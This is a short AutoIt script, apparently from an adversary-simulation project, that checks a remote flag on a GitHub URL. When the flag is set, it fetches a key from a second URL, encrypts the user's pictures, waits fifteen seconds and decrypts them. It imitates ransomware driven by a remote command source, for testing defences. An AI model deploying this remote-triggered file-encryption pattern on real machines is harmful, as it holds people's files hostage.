#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/files.au3"

$flag_url = 'https://raw.githubusercontent.com/filippostz/APT-SimulActor/master/etc/flag.txt'

$key_url = 'https://raw.githubusercontent.com/filippostz/APT-SimulActor/master/etc/key.txt'

$flag = ReadRemoteVar($flag_url)

if $flag = 1 Then

   $key = ReadRemoteVar($key_url)

   EncryptPictures($key)

   Sleep(15000)

   DecryptPictures($key)

EndIf


